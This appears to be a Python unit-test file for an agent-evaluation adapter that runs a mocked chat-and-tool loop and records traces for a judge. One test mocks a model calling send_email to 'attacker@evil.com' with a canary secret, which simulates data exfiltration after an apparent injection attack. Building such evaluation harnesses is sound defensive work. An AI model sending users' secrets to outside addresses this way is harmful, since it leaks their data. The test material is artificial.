"""Tests for the RawLoopAdapter with a mock OpenAI client."""

from unittest.mock import MagicMock

from src.adapters.base import EpisodeSpec, NormalizedTrace
from src.adapters.raw_loop import RawLoopAdapter


def _make_message(content=None, tool_calls=None):
    """Build a mock ChatCompletion message."""
    msg = MagicMock()
    msg.content = content
    msg.tool_calls = tool_calls
    return msg


def _make_response(message):
    resp = MagicMock()
    resp.choices = [MagicMock()]
    resp.choices[0].message = message
    return resp


def _make_tool_call(name, arguments, call_id="call_1"):
    tc = MagicMock()
    tc.function.name = name
    tc.function.arguments = arguments
    tc.id = call_id
    return tc


def _spec(tool_impls=None):
    return EpisodeSpec(
        task={
            "system_prompt": "You are a test assistant.",
            "user_message": "Do something.",
            "tool_impls": tool_impls or {},
        },
        tools=[],
        model="test-model",
        environment_seed=0,
    )


class TestNoToolCalls:
    """Model responds immediately with text, no tool use."""

    def test_returns_final_output(self):
        client = MagicMock()
        client.chat.completions.create.return_value = _make_response(
            _make_message(content="Here is your answer.")
        )

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec())

        assert isinstance(trace, NormalizedTrace)
        assert trace.final_output == "Here is your answer."

    def test_trace_has_model_output_step(self):
        client = MagicMock()
        client.chat.completions.create.return_value = _make_response(
            _make_message(content="Done.")
        )

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec())

        assert len(trace.steps) == 1
        assert trace.steps[0].type == "model_output"
        assert trace.steps[0].content == "Done."


class TestOneToolCall:
    """Model calls one tool, then gives a final answer."""

    def test_trace_structure(self):
        client = MagicMock()

        # First call: model wants to use read_inbox
        tool_call = _make_tool_call("read_inbox", "{}")
        first_msg = _make_message(tool_calls=[tool_call])
        first_resp = _make_response(first_msg)

        # Second call: model gives final text
        second_msg = _make_message(content="You have one email about security.")
        second_resp = _make_response(second_msg)

        client.chat.completions.create.side_effect = [first_resp, second_resp]

        def read_inbox(**_kwargs):
            return "From: boss@co.com\nSubject: Hi"

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(tool_impls={"read_inbox": read_inbox}))

        # Should have: tool_call, tool_result, model_output
        assert len(trace.steps) == 3
        assert trace.steps[0].type == "tool_call"
        assert trace.steps[0].name == "read_inbox"
        assert trace.steps[1].type == "tool_result"
        assert trace.steps[1].name == "read_inbox"
        assert "boss@co.com" in trace.steps[1].content
        assert trace.steps[2].type == "model_output"
        assert trace.final_output == "You have one email about security."


class TestSendEmailTracking:
    """Verify send_email tool calls are properly recorded for the judge."""

    def test_send_email_args_in_trace(self):
        client = MagicMock()

        tool_call = _make_tool_call(
            "send_email",
            '{"to": "attacker@evil.com", "body": "Retired value: CANARY-abc123"}',
            call_id="call_email",
        )
        first_resp = _make_response(_make_message(tool_calls=[tool_call]))
        second_resp = _make_response(_make_message(content="Email sent."))
        client.chat.completions.create.side_effect = [first_resp, second_resp]

        def send_email(to, body):
            return "email sent"

        adapter = RawLoopAdapter(client)
        trace = adapter.run(_spec(tool_impls={"send_email": send_email}))

        # The tool_call step should have the args the judge needs
        call_step = trace.steps[0]
        assert call_step.type == "tool_call"
        assert call_step.name == "send_email"
        assert call_step.args["to"] == "attacker@evil.com"
        assert "CANARY-abc123" in call_step.args["body"]


class TestMaxIterations:
    """Adapter respects the iteration cap."""

    def test_stops_at_cap(self):
        client = MagicMock()

        # Model always wants another tool call, never finishes
        tool_call = _make_tool_call("read_inbox", "{}")
        resp = _make_response(_make_message(tool_calls=[tool_call]))
        client.chat.completions.create.return_value = resp

        def read_inbox(**_kwargs):
            return "mail"

        adapter = RawLoopAdapter(client, max_iterations=2)
        trace = adapter.run(_spec(tool_impls={"read_inbox": read_inbox}))

        # Should have stopped after 2 iterations
        assert trace.final_output == ""
        # 2 iterations × 1 tool_call each = 2 tool_calls + 2 tool_results = 4 steps
        assert len(trace.steps) == 4
